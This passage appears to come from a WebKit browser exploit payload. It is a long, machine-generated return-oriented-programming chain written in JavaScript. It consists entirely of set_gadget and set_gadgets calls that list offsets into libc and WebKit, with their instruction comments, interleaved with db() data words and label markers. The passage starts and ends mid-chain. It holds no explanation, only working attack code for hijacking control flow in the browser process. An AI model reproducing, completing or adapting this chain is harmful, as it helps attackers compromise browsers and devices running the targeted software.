db([4294967256, 4294967295]); // -0x28
set_gadget(libc_base+206806,); //pop rdi
//L2718:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
webkit_base+2997875, //mov [rax], rcx
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L2720:
db([4294967284, 4294967295]); // -0xc
set_gadget(libc_base+792472,); //pop rcx
//L2721:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+176408, //L2723
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+176424, //L2724
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L2723:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2724:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191169, //mov eax, [rdi]
libc_base+793877, //pop rsi
ropchain+176576, //L2727
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+176608, //L2729
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+176560, //L2726
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+176592, //L2728
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2726:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L2727:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2728:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2729:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+176696, //L2730
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+176728, //L2732
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+792472 //pop rcx
]);
//L2730:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L2731:
db([4294967252, 4294967295]); // -0x2c
set_gadget(libc_base+206806,); //pop rdi
//L2732:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
webkit_base+954100, //mov [rax], ecx
libc_base+793877, //pop rsi
ropchain+176792, //L2736
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L2736:
db([0, 0]); // 0x0
//L2734:
set_gadgets([
libc_base+793877, //pop rsi
ropchain+176856, //L2738
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L2737:
db([4294967252, 4294967295]); // -0x2c
set_gadget(libc_base+792472,); //pop rcx
//L2738:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+176944, //L2740
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+176960, //L2741
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L2740:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2741:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191169, //mov eax, [rdi]
libc_base+793877, //pop rsi
ropchain+177112, //L2744
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+177144, //L2746
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+177096, //L2743
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+177128, //L2745
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2743:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L2744:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2745:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2746:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+177216, //L2747
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+177232, //L2748
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L2747:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2748:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+177336, //L2750
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+177384, //L2753
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+177352, //L2751
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2750:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L2751:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L2752:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2753:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+11676600, //cmp rax, rsi ; sete al
libc_base+269973, //movzx eax, al
webkit_base+414627, //shl rax, 3
libc_base+793877, //pop rsi
ropchain+177496, //L2754+8
libc_base+547636, //add rax, rsi
libc_base+186490, //mov rax, [rax]
libc_base+793877, //pop rsi
ropchain+177488, //L2754
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+811575 //pop rsp
]);
//L2754:
db([0, 0]); // 0x0
set_gadgets([
ropchain+177512, //L2754+24
ropchain+182776, //L2749
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L2756:
db([4294967252, 4294967295]); // -0x2c
set_gadget(libc_base+792472,); //pop rcx
//L2757:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+177632, //L2758
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+177648, //L2759
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L2758:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2759:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191169, //mov eax, [rdi]
libc_base+793877, //pop rsi
ropchain+177800, //L2762
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+177832, //L2764
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+177784, //L2761
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+177816, //L2763
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2761:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L2762:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2763:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2764:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+177904, //L2765
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+177920, //L2766
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L2765:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2766:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+178016, //L2768
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+178000, //L2767
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L2767:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2768:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+178112, //L2770
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L2769:
db([4294967256, 4294967295]); // -0x28
set_gadget(libc_base+792472,); //pop rcx
//L2770:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+178200, //L2772
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+178216, //L2773
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L2772:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2773:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+178360, //L2777
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+178328, //L2775
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+178344, //L2776
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L2775:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2776:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2777:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+178456, //L2779
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L2778:
db([4294967280, 4294967295]); // -0x10
set_gadget(libc_base+792472,); //pop rcx
//L2779:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+178544, //L2781
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+178560, //L2782
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L2781:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2782:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191169, //mov eax, [rdi]
libc_base+793877, //pop rsi
ropchain+178712, //L2785
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+178744, //L2787
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+178696, //L2784
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+178728, //L2786
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2784:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L2785:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2786:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2787:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+178840, //L2789
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+178824, //L2788
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L2788:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2789:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+788575, //pop rax
//L2791:
ropchain+178944, //L2790
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+811575, //pop rsp
ropchain+189312, //L2792
//L2790:
libc_base+882884, //mov rax, rcx
libc_base+793877 //pop rsi
]);
db([4294967272, 4294967295]); // -0x18
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+179032, //L2794
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L2793:
db([4294967248, 4294967295]); // -0x30
set_gadget(libc_base+792472,); //pop rcx
//L2794:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
webkit_base+954100, //mov [rax], ecx
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L2796:
db([4294967248, 4294967295]); // -0x30
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+179160, //L2798
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+179176, //L2799
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L2798:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2799:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191169, //mov eax, [rdi]
libc_base+793877, //pop rsi
ropchain+179328, //L2802
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+179360, //L2804
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+179312, //L2801
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+179344, //L2803
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2801:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L2802:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2803:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2804:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+179432, //L2805
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+179448, //L2806
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L2805:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2806:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+179544, //L2808
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+179528, //L2807
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L2807:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2808:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+179624, //L2809
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2809:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L2810:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2811:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+179776, //L2813
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+179792, //L2814
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+179760, //L2812
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L2812:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2813:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2814:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
webkit_base+14959219, //cmp rax, rcx ; sete al
webkit_base+8824269, //setle al
libc_base+269973, //movzx eax, al
libc_base+793877, //pop rsi
ropchain+179960, //L2816
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+179976, //L2817
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+179944, //L2815
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2815:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L2816:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2817:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+180080, //L2819
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+180128, //L2822
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+180096, //L2820
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2819:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L2820:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L2821:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2822:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+11676600, //cmp rax, rsi ; sete al
libc_base+269973, //movzx eax, al
webkit_base+414627, //shl rax, 3
libc_base+793877, //pop rsi
ropchain+180240, //L2823+8
libc_base+547636, //add rax, rsi
libc_base+186490, //mov rax, [rax]
libc_base+793877, //pop rsi
ropchain+180232, //L2823
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+811575 //pop rsp
]);
//L2823:
db([0, 0]); // 0x0
set_gadgets([
ropchain+180256, //L2823+24
ropchain+180272, //L2818
libc_base+811575, //pop rsp
ropchain+182808, //L2824
//L2818:
libc_base+793877, //pop rsi
ropchain+180328, //L2826
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L2825:
db([4294967256, 4294967295]); // -0x28
set_gadget(libc_base+792472,); //pop rcx
//L2826:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+180416, //L2828
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+180432, //L2829
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L2828:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2829:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+180576, //L2833
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+180544, //L2831
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+180560, //L2832
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L2831:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2832:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2833:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+180648, //L2835
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L2835:
db([0, 0]); // 0x0
set_gadgets([
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+180704, //L2836
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L2836:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+180800, //L2839
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L2838:
db([4294967248, 4294967295]); // -0x30
set_gadget(libc_base+792472,); //pop rcx
//L2839:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+180888, //L2841
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+180904, //L2842
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L2841:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2842:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191169, //mov eax, [rdi]
libc_base+793877, //pop rsi
ropchain+181056, //L2845
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+181088, //L2847
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+181040, //L2844
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+181072, //L2846
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2844:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L2845:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2846:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2847:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+181208, //L2849
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+181224, //L2850
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+181192, //L2848
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L2848:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2849:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2850:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
webkit_base+1838146, //add rax, rcx
libc_base+793877, //pop rsi
ropchain+181312, //L2852
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L2852:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+181368, //L2853
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L2853:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+181456, //L2856
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L2855:
db([4294967256, 4294967295]); // -0x28
set_gadget(libc_base+792472,); //pop rcx
//L2856:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
webkit_base+2997875, //mov [rax], rcx
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L2858:
db([4294967252, 4294967295]); // -0x2c
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+181584, //L2860
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+181600, //L2861
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L2860:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2861:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191169, //mov eax, [rdi]
libc_base+793877, //pop rsi
ropchain+181752, //L2864
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+181784, //L2866
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+181736, //L2863
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+181768, //L2865
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2863:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L2864:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2865:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2866:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+181880, //L2868
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+181864, //L2867
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L2867:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2868:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+181976, //L2870
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L2869:
db([4294967248, 4294967295]); // -0x30
set_gadget(libc_base+792472,); //pop rcx
//L2870:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+182064, //L2872
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+182080, //L2873
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L2872:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2873:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191169, //mov eax, [rdi]
libc_base+793877, //pop rsi
ropchain+182232, //L2876
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+182264, //L2878
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+182216, //L2875
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+182248, //L2877
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2875:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L2876:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2877:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2878:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+182384, //L2880
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+182400, //L2881
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+182368, //L2879
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L2879:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2880:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2881:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+877175, //sub rax, rcx ; sbb rdx, rcx
libc_base+793877, //pop rsi
ropchain+182552, //L2883
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+182568, //L2884
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
